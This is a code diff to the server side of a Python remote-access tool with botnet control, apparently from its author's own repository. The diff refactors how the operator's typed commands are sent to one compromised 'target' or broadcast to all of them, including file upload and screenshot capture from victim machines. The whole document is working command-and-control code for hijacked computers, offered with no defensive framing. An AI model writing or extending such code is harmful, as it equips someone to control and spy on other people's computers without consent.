@@ -16,6 +16,7 @@ class Server:
         self.connections = threading.Thread(target=self.accept_connections)
         self.connections.start()
         self.number = 0
+        self.run_single_target = True
 
     def accept_connections(self):
         while True:
@@ -53,20 +54,16 @@ class Server:
         with open(path, 'rb') as file:
             return file.read()
 
-    def single_target(self, target, ip):
-        while True:
-            command = input(f'{ip}>> ')
-            command = command.split(' ')
-
-            try:
+    def command_result(self, command, target):
+        try:
+            if command[0] == 'exit':
+                self.run_single_target = False
+            else:
                 if command[0] == 'upload':
                     file_data = self.read_file(command[1])
                     command.append(file_data.decode("ISO-8859-1"))
 
                 self.send_data(command, target)
-
-                if command[0] == 'exit':
-                    break
 
                 if command[0] == 'screenshot':
                     file_data = self.receive_data(target)
@@ -84,8 +81,15 @@ class Server:
                 else:
                     result = self.receive_data(target)
                     print(result)
-            except Exception as exc:
-                print('Server error, check your command', exc)
+        except Exception as exc:
+            print('Server error, check your command', exc)
+
+    def single_target(self, target, ip):
+        self.run_single_target = True
+        while self.run_single_target:
+            command = input(f'{ip}>> ')
+            command = command.split(' ')
+            self.command_result(command, target)
 
     def botnet(self):
         while True:
@@ -95,7 +99,7 @@ class Server:
             try:
                 if command[0] == 'list':
                     for count, ip in enumerate(self.ips):
-                        print(f'Target {count} with ip {ip}')
+                        print(f'---Target {count}: ip {ip}')
                     if len(self.ips) == 0:
                         print('[-] List is empty')
 
@@ -130,9 +134,8 @@ class Server:
                 elif command[0] == 'botnet':
                     try:
                         for i, target in enumerate(self.targets):
-                            self.send_data(command[1], target)
-                            result = self.receive_data(target)
-                            print(f'{self.ips[i]} - {result}')
+                            print(f'{self.ips[i]}')
+                            self.command_result(command[1:], target)
                     except Exception:
                         print(f'[-] Failed while sending {command[1]}')
                 else:
